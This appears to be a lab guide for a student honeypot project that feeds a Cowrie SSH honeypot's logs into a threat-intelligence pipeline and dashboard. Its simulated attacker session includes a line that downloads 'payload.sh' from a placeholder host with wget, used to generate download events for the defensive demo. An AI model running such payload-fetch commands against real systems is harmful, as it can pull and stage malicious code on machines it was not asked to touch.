# Live Lab Demo

This guide connects the project to a real Cowrie honeypot running in an isolated lab so you can attack it from another machine and watch the dashboard update.

## Goal

Use a real Cowrie instance to produce:

- login attempts
- successful sessions
- attacker commands
- download attempts
- saved records in the pipeline
- dashboard updates and report outputs

## Lab Shape

- **Machine A**: the Cowrie host or VM
- **Machine B**: your laptop or another machine used to attack the honeypot
- **This repository** can run on the same host as Cowrie or on a second host that can read the Cowrie JSON log file

The safest setup for tomorrow is:

1. run Cowrie in an isolated VM
2. expose only the demo SSH port
3. run the pipeline and dashboard on the same machine as the repository

## Cowrie Setup

The repo includes a Docker-based Cowrie setup under [docker-compose.yml](/home/fe/honeypot-threat-intelligence-pipeline/docker/cowrie/docker-compose.yml).

This uses the official Cowrie Docker image and binds SSH to port `2222`, matching the Cowrie Docker quick start in the official docs. Cowrie’s docs also identify `var/log/cowrie/cowrie.json` as the JSON audit log that the pipeline should consume. Sources:

- https://docs.cowrie.org/en/stable/docker/README.html
- https://docs.cowrie.org/en/stable/README.html

Start Cowrie:

```bash
scripts/lab-demo.sh up-cowrie
```

Follow container logs:

```bash
scripts/lab-demo.sh cowrie-logs
```

## Pipeline And Dashboard

Run the live pipeline in one terminal:

```bash
scripts/lab-demo.sh pipeline
```

Run the dashboard in another terminal:

```bash
scripts/lab-demo.sh dashboard
```

Open:

`http://127.0.0.1:5000/events?refresh=3`

## Demo Attacks From Your Machine

From your local machine or another VM, connect to the Cowrie host:

```bash
ssh -p 2222 root@<target-ip>
```

The included lab-only [userdb.txt](/home/fe/honeypot-threat-intelligence-pipeline/docker/cowrie/etc/userdb.txt) is intentionally permissive so you can get an interactive shell quickly in the isolated demo environment.

After login, run commands like:

```bash
whoami
uname -a
pwd
ls
wget http://example.com/payload.sh
curl http://example.com
```

These should create:

- authentication events
- command input events
- possible file download events

## What To Show

Show the professor:

1. the Cowrie container is running
2. the attack machine connects to port `2222`
3. the pipeline is following the live log file
4. the dashboard updates with new events
5. the detail page shows indicators, classification, and threat-intel fields
6. the project can export a blocklist and markdown report

Generate the report bundle:

```bash
scripts/lab-demo.sh report
```

## Notes

- This setup is for an isolated lab only.
- The permissive login policy in the bundled Cowrie `userdb.txt` is for demonstration only.
- Do not expose this directly to the public internet without proper isolation and a deliberate risk decision.
